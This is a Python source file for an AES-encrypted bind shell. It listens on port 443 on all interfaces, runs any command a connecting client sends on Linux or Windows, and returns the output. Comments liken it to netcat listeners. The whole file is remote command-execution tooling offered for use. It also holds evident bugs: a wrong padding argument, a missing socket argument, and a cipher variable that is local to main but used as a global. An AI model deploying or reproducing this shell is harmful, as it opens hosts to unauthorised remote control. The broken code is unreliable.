#!/usr/bin/env python3
import sys
import socket
import argparse
import platform
import threading
import subprocess

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

DEFAULT_PORT = 443
MAX_BUFFER = 4096

class AESCipher:
    def __init__(self, key=None):
        self.key = key if key else get_random_bytes(32)
        self.cipher = AES.new(self.key, AES.MODE_ECB)
    
    def encrypt(self, plaintext):
        return self.cipher.encrypt(pad(plaintext, AES))

    def decrypt(self, encrypted):
        return unpad(self.cipher.decrypt(bytearray.fromhex(encrypted)), AES.block_size)

    def __str__(self):
        return f"Key: {self.key.hex()}"

def encrypted_send(s, msg):
    """Send an AES-encrypted message."""
    s.send(cipher.encrypt(msg).encode('latin-1'))

def execute_cmd(cmd):
    """Execute a Linux/Windows command."""

    # On Linux system
    if platform.system() == 'Linux':
        try:
            output = subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT)
        except:
            output = b'Command failed.'
    # On Windows system
    elif platform.system() == 'Windows':
        try:
            output = subprocess.check_output(f"cmd /c {cmd}", stderr=subprocess.STDOUT)
        except:
            output = b'Command failed.'
    
    return output

def decode_and_strip(s):
    """Decode and strip the string."""
    return s.decode('latin-1').strip()

def cleanup(s):
    """Close the socket and exit the program."""
    s.close()
    sys.exit()

def shell_thread(s):
    """Multithreading interactive shell sesion."""
    encrypted_send(b"[ -- Connected -- ]")
    try:
        while True:
            encrypted_send(s, b"Enter command>")
            data = s.recv(MAX_BUFFER)

            if data:
                buffer= cipher.decrypt(decode_and_strip(data))
                if not buffer or buffer == 'exit':
                    cleanup(s)

                print(f"> Executing command: '{buffer}'")
                encrypted_send(s, execute_cmd(buffer))
    except:
        print("shell_thread error. Terminating...")
        cleanup(s)

def send_thread(s):
    """Multithreading send()."""
    try:
        while True:
            data = input() + '\n'
            encrypted_send(s, data.encode('latin-1'))
    except:
        print('send_thread error. Terminating...')
        cleanup(s)

def recv_thread(s):
    """Multithreading recv()."""
    try:
        while True:
            data = decode_and_strip(s.recv(MAX_BUFFER))
            if data:
                data = cipher.decrypt(data).decode('latin-1')
                print(data, end='', flush=True)
    except:
        print('recv_thread error. Terminating...')
        cleanup(s)

def server():
    """Socket server."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', DEFAULT_PORT))
    s.listen()

    print('[ -- Starting Bind Shell -- ]')
    while True:
        client_socket, addr = s.accept()
        print('[ -- New User Connected -- ]')
        threading.Thread(target=shell_thread, args=(client_socket,)).start()

def client(ip):
    """Socket client."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, DEFAULT_PORT))

    print('[ -- Connecting to Bind Shell -- ]')
    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=recv_thread, args=(s,)).start()

def main():
    parser = argparse.ArgumentParser()

    # Usage: python3 bind_shell.py -l
    # This is similar to nc -nvlp 1337
    parser.add_argument(
        '-l',
        '--listen',
        action='store_true',
        help='Setup a bind shell',
        required=False,
    )
    # Usage: python3 bind_shell.py -c 127.0.0.1
    # This is similar to nc 127.0.0.1 1337
    parser.add_argument(
        '-c',
        '--connect',
        help='Connect to a bind shell',
        required=False,
    )
    # Usage: python3 bind_shell.py -c 127.0.0.1 -k 
    # This is similar to nc 127.0.0.1 1337
    parser.add_argument(
        '-k',
        '--key',
        help='Encryption key',
        required=False,
    )

    args = parser.parse_args()

    if args.connect and not args.key:
        parser.error('Key is needed. Use -k <key>.')
    
    if args.key:
        cipher = AESCipher(bytearray.fromhex(args.key))
    else:
        cipher = AESCipher()
        
    print(cipher)

    if args.listen:
        server()
    elif args.connect:
        client(args.connect)

if __name__ == '__main__':
    main()
